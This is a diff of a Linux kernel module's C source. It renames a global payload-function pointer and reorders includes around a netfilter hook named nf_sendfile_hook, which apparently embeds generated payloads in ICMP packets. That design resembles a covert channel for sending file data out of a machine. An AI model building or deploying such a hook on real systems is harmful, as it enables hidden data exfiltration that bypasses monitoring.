@@ -1,16 +1,16 @@
-#include "netfilter.h"
-#include "../net/checksum.h"
-#include "../fs/payload_generator.h"
-
 #include <linux/ip.h>
 #include <linux/icmp.h>
 #include <linux/skbuff.h>
+
+#include "netfilter.h"
+#include "../net/checksum.h"
+#include "../fs/payload_generator.h"
 
 #define ICMPHDR_TIMESTAMP_FIELD_SIZE (8)
 
 static struct nf_hook_ops netfilter_hook;
 
-get_payload_func_t get_payload_func = NULL;
+get_payload_func_t g_get_payload_func = NULL;
 
 /**
  * implementation of skb_put_data (was introduced in later kernel versions).
@@ -40,7 +40,7 @@ unsigned int nf_sendfile_hook(void *priv,
                               struct sk_buff *skb,
                               const struct nf_hook_state *state)
 {
-    if (NULL == get_payload_func) {
+    if (NULL == g_get_payload_func) {
         // as long as we don't have a way to get our payloads, we don't 
         // have much to do.
         return NF_ACCEPT;
@@ -66,8 +66,8 @@ unsigned int nf_sendfile_hook(void *priv,
     }
 
     // get the payload we wish to send. payload_data acts as an output 
-    // parameter to which get_payload_func copies the payload.
-    if (get_payload_func(payload_data, &actual_payload_size)) {
+    // parameter to which g_get_payload_func copies the payload.
+    if (g_get_payload_func(payload_data, &actual_payload_size)) {
         return NF_ACCEPT;
     }
 
